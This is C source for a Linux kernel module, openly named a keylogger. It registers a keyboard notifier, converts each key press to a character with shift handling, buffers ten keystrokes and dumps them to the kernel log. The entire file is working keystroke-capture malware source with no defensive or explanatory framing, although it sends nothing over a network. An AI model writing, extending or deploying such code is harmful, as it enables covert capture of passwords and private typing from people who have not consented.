#include <linux/module.h>
#include <linux/keyboard.h>
#include <linux/semaphore.h>

#include "kbduskeymap.h"

struct semaphore sem;

static int shiftKeyPressed = 0;

int j = 0;
int numChars = 10;
char* op[10];

void printrev(void){
	int i;
	for(i=0;i<numChars;i++){
		printk(KERN_INFO "%s\n",op[numChars-1-i]);
	}
	printk(KERN_INFO "------------------------------------");
}


int keylogger_notify(struct notifier_block *nblock, unsigned long code,
                    void *_param)
{ 
    struct keyboard_notifier_param *param = _param;

    if (code == KBD_KEYCODE)
    {
        if (param->value==42 || param->value==54)
        {
            down(&sem);
            if (param->down)
                shiftKeyPressed = 1;
            else
                shiftKeyPressed = 0;
            up(&sem);
            return NOTIFY_OK;
        }

        if (param->down)
        
{            down(&sem);
            if (shiftKeyPressed == 0){
                op[j] = keymap[param->value];
                j++;
                if(j==numChars){
                	printrev();
                	j = 0;
                }
                // printk(KERN_INFO "%s\n", keymap[param->value]);

            }
            else{
                // printk(KERN_INFO "%s\n", keymapShiftActivated[param->value]);
                op[j] = keymapShiftActivated[param->value];
                j++;
                if(j==numChars){
                	printrev();
                	j = 0;
                }

            }
            up(&sem);
        }
    }

    return NOTIFY_OK;
}

static struct notifier_block keylogger_nb =
{
    .notifier_call = keylogger_notify
};

int init_module(void)
{
    register_keyboard_notifier(&keylogger_nb);
    printk(KERN_INFO "Registering the keylogger module with the keyboard "
        "notifier list\n");
    sema_init(&sem, 1);
    return 0;
}

void cleanup_module(void)
{
    unregister_keyboard_notifier(&keylogger_nb);
    printk(KERN_INFO "Unregistered the keylogger module\n");

}

MODULE_LICENSE("GPL");
